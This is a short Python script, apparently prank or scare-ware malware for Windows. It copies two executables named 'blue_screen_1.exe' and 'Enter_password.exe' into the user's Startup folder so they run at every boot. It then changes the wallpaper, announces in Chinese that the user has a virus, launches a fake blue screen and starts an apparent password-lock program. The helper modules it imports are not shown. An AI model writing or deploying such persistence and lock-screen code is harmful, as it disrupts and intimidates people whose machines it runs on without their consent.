import os
import time
import sys
from tkinter import messagebox

def get_startup_folder():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    return startup_folder

# 获取启动文件夹路径
startup_folder = get_startup_folder()

def check_file_in_startup(filename):
    # 检查文件夹是否存在
    if not os.path.exists(startup_folder):
        print(f"启动文件夹不存在: {startup_folder}")
        return False
    # 检查文件是否存在
    file_path = os.path.join(startup_folder, filename)
    if os.path.isfile(file_path):
        print(f"文件 '{filename}' 存在于启动文件夹中")
        return True
    else:
        print(f"文件 '{filename}' 不存在于启动文件夹中")
        from assist.startup import startup_main
        exe_file_path = r"EXE/blue_screen_1.exe"
        startup_main(exe_file_path)
        exe_file_path = r"EXE/Enter_password.exe"
        startup_main(exe_file_path)
        return False

def check():
    print("正在检查...")
    check_file_in_startup("blue_screen_1.exe")  # 检查没有就复制过去（设置开机启动项）
    check_file_in_startup("Enter_password.exe")  # 检查没有就复制过去（设置开机启动项）
    time.sleep(1)
    print("检查完成!")
    main()

def main():
    print("程序启动中...")
    time.sleep(1)
    from assist.change_wallpaper import change_wallpaper_main  # 用于切换壁纸
    change_wallpaper_main()
    print("中病毒啦!")
    os.system(f"start EXE/blue_screen_1.exe")  # 先蓝屏
    messagebox.showinfo("提示", "你中病毒啦!")  # 提示中毒
    time.sleep(1)
    os.system(f"start EXE/Enter_password.exe")  # 开始输入密码
    sys.exit()

if __name__ == "__main__":
    check()